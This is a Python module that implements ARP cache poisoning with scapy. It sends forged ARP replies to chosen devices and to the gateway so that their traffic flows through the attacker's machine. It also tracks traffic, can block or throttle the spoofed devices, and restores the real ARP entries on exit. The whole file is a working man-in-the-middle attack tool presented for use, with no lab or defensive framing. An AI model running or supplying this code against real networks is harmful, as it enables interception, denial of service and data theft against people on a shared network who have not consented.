"""
ARP Spoofer - Man-in-the-middle attack via ARP cache poisoning.

Normal:  Device <-> Router <-> Internet
Spoofed: Device <-> Us <-> Router <-> Internet

We send fake ARP replies to:
1. Tell target: "Gateway MAC is <our_mac>"
2. Tell gateway: "Target MAC is <our_mac>"

All traffic then flows through our machine.
"""

import time
import threading
from typing import Optional
from dataclasses import dataclass, field
from scapy.all import ARP, Ether, sendp, send, conf, get_if_hwaddr
from enum import Enum


class DeviceStatus(Enum):
    NORMAL = "normal"
    SPOOFED = "spoofed"
    BLOCKED = "blocked"
    LIMITED = "limited"


@dataclass
class SpoofTarget:
    """Device being spoofed with traffic stats."""
    ip: str
    mac: str
    status: DeviceStatus = DeviceStatus.SPOOFED
    bandwidth_limit_kbps: Optional[int] = None
    packets_sent: int = 0
    bytes_sent: int = 0
    packets_received: int = 0
    bytes_received: int = 0


class ARPSpoofer:
    """
    Performs ARP cache poisoning to intercept network traffic.
    
    ARP packets have:
    - hwsrc: Source MAC (we put ours)
    - psrc: Source IP (we claim gateway/target IP)
    
    This tricks devices into sending traffic to us.
    """

    def __init__(self, interface: Optional[str] = None):
        self.interface = interface or str(conf.iface)
        self.our_mac = get_if_hwaddr(self.interface)
        self.targets: dict[str, SpoofTarget] = {}
        self.gateway_ip: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self._spoofing_active = False
        self._spoof_thread: Optional[threading.Thread] = None
        conf.verb = 0

    def set_gateway(self, gateway_ip: str, gateway_mac: str):
        """Set the gateway information."""
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")

    def add_target(self, ip: str, mac: str) -> SpoofTarget:
        """Add a device to be spoofed."""
        if ip == self.gateway_ip:
            raise ValueError("Cannot spoof the gateway directly")

        target = SpoofTarget(ip=ip, mac=mac)
        self.targets[ip] = target
        print(f"[+] Target added: {ip} ({mac})")
        return target

    def remove_target(self, ip: str):
        """Remove target and restore its ARP table."""
        if ip in self.targets:
            self._restore_target(ip)
            del self.targets[ip]
            print(f"[-] Target removed: {ip}")

    def set_target_status(self, ip: str, status: DeviceStatus,
                          bandwidth_limit_kbps: Optional[int] = None):
        """Update target status (BLOCKED drops packets, LIMITED throttles)."""
        if ip not in self.targets:
            raise ValueError(f"Target {ip} not found")

        target = self.targets[ip]
        target.status = status
        target.bandwidth_limit_kbps = bandwidth_limit_kbps
        print(f"[*] {ip} -> {status.value}" + (f" ({bandwidth_limit_kbps} Kbps)" if bandwidth_limit_kbps else ""))

    def _create_spoof_packet(self, target_ip: str, target_mac: str,
                              spoof_ip: str) -> Ether:
        """Create spoofed ARP reply claiming we have spoof_ip."""
        return Ether(dst=target_mac, src=self.our_mac) / ARP(
            op=2,  # ARP Reply
            hwsrc=self.our_mac,
            psrc=spoof_ip,
            hwdst=target_mac,
            pdst=target_ip
        )

    def _spoof_target(self, target: SpoofTarget):
        """Send bidirectional spoof packets for a target."""
        # Tell target: "Gateway is at our MAC"
        target_packet = self._create_spoof_packet(
            target.ip, target.mac, self.gateway_ip
        )
        # Tell gateway: "Target is at our MAC"
        gateway_packet = self._create_spoof_packet(
            self.gateway_ip, self.gateway_mac, target.ip
        )

        sendp(target_packet, iface=self.interface, verbose=False)
        sendp(gateway_packet, iface=self.interface, verbose=False)

    def _restore_target(self, target_ip: str):
        """Send correct ARP info to undo spoofing."""
        target = self.targets.get(target_ip)
        if not target:
            return

        print(f"[*] Restoring ARP for {target_ip}")

        # Tell target the real gateway MAC
        restore_target = Ether(dst=target.mac, src=self.gateway_mac) / ARP(
            op=2, hwsrc=self.gateway_mac, psrc=self.gateway_ip,
            hwdst=target.mac, pdst=target.ip
        )
        # Tell gateway the real target MAC
        restore_gateway = Ether(dst=self.gateway_mac, src=target.mac) / ARP(
            op=2, hwsrc=target.mac, psrc=target.ip,
            hwdst=self.gateway_mac, pdst=self.gateway_ip
        )

        for _ in range(5):
            sendp(restore_target, iface=self.interface, verbose=False)
            sendp(restore_gateway, iface=self.interface, verbose=False)
            time.sleep(0.2)

    def _spoofing_loop(self):
        """Continuously send spoof packets to maintain MITM position."""
        print("[*] Spoofing loop started")

        while self._spoofing_active:
            for target in list(self.targets.values()):
                if target.status != DeviceStatus.NORMAL:
                    self._spoof_target(target)
            time.sleep(1.5)

        print("[*] Spoofing loop stopped")

    def start_spoofing(self):
        """Start ARP spoofing. Requires IP forwarding to be enabled."""
        if not self.gateway_ip or not self.gateway_mac:
            raise RuntimeError("Gateway not set")
        if not self.targets:
            raise RuntimeError("No targets added")
        if self._spoofing_active:
            return

        self._spoofing_active = True
        self._spoof_thread = threading.Thread(target=self._spoofing_loop, daemon=True)
        self._spoof_thread.start()
        print(f"[+] Spoofing {len(self.targets)} target(s)")

    def stop_spoofing(self):
        """Stop spoofing and restore all ARP tables."""
        if not self._spoofing_active:
            return

        print("[*] Stopping spoofer...")
        self._spoofing_active = False

        if self._spoof_thread:
            self._spoof_thread.join(timeout=3)

        for ip in list(self.targets.keys()):
            self._restore_target(ip)

        print("[+] Spoofing stopped, ARP restored")

    def get_targets(self) -> list[SpoofTarget]:
        return list(self.targets.values())

    def is_active(self) -> bool:
        return self._spoofing_active


if __name__ == "__main__":
    print("ARP Spoofer module - use through main application")
